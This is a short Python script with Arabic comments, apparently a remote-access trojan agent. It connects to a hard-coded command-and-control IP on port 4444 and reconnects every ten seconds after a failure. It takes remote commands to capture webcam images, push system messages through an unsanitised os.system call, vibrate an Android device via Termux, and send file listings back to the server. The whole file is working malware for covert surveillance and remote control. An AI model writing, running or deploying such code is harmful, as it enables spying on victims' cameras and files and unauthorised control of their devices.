import socket
import os
import cv2
import time
import subprocess

# --- الإعدادات الموجهة للسيرفر ---
C2_IP = "172.233.220.238" 
C2_PORT = 4444

def start_agent():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            while True:
                data = s.recv(1024).decode()
                if not data: break
                
                # تنفيذ الأوامر المستلمة من البوت
                if data.startswith("cam_"):
                    idx = int(data.split("_")[1])
                    cap = cv2.VideoCapture(idx)
                    ret, frame = cap.read()
                    if ret: cv2.imwrite("shot.jpg", frame)
                    cap.release()
                
                elif data.startswith("msg:"):
                    msg_content = data.split(":")[1]
                    # عرض إشعار للنظام (مثال لنظام ويندوز)
                    os.system(f'msg * "{msg_content}"')
                
                elif data == "vibrate":
                    # يتطلب صلاحيات الاندرويد عبر ترمكس
                    os.system("termux-vibrate -d 1000")
                
                elif data == "ls":
                    files = subprocess.getoutput("ls")
                    s.send(files.encode())
            s.close()
        except:
            # إعادة المحاولة كل 10 ثواني في حال فقدان الاتصال
            time.sleep(10)

if __name__ == "__main__":
    start_agent()